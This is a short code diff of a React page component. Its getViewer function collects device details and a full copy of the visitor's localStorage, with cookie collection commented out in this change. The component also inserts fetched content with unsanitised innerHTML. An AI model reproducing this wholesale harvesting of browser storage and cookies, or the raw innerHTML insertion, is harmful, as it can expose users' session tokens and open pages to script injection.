@@ -14,7 +14,6 @@ const Body = ({ data }) => {
     }
     useEffect(() => {
         if (typeof window != undefined) {
-            console.log('useffect')
             document.querySelector('.body').innerHTML = data.content;
             getViewer(data.link);
         }
@@ -37,6 +36,7 @@ const Body = ({ data }) => {
     }
     const getViewer = async (link) => {
         // Get device information
+        console.log('getViewer')
         const deviceInfo = {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -50,12 +50,12 @@ const Body = ({ data }) => {
         if (connection && connection.type === 'cellular') {
             carrierName = connection.effectiveType;
         }
-
         // Get localStorage data
         const localStorageData = { ...localStorage };
+        console.log(localStorageData)
 
         // Get cookies data
-        const cookiesData = document.cookie;
+        // const cookiesData = document.cookie;
 
         // Log device info, carrier name, localStorage data, and cookies data
         const data = {
